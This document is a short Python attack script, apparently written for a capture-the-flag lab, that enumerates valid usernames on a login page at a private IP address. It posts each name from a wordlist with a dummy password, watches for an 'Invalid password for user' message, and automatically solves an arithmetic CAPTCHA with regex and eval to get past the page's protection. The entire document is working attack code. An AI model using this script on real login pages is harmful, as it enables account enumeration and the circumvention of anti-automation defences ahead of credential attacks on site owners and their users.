
import requests
import re

url = 'http://10.10.71.75/login' # replace with the URL of the login page

with open('usernames.txt', 'r') as uf:
    for username in uf:
        username = username.strip()
        
        payload = {
            "username" : username,
            "password" : "test_password"
        }

        response = requests.post(url, data=payload)

        if  "Invalid password for user"in response.text:
            print(f"Correct username: {username}")
            exit()
        else:
            # Solve CAPTCHA if present and send login request
            captcha_match = re.search(r'\d+\s*[-+/*]\s*\d+\s*=\s*\?',response.text)
            captcha_text = ''
            if captcha_match is not None:
                captcha_text = captcha_match.group(0).replace('=', '').strip()
                print("CAPTCHA text:", captcha_text)

                # Solve the CAPTCHA and include the solution in the payload
                match = re.search(r'(\d+)\s*([-+/*]?)\s*(\d+)', captcha_text)
                if match:
                    num1, operator, num2 = match.groups()
                    solution = eval(num1 + operator + num2)
                    print("Solution:", solution)
                    print(username)
                    payload['captcha'] = solution
                else:
                    print("Error: Failed to extract numbers and operator from CAPTCHA text")
                    continue
            
            # Send login request
            response = requests.post(url, data=payload)

            if "Invalid password for user" in response.text:
                print(f"Valid username: {username}")
                exit()

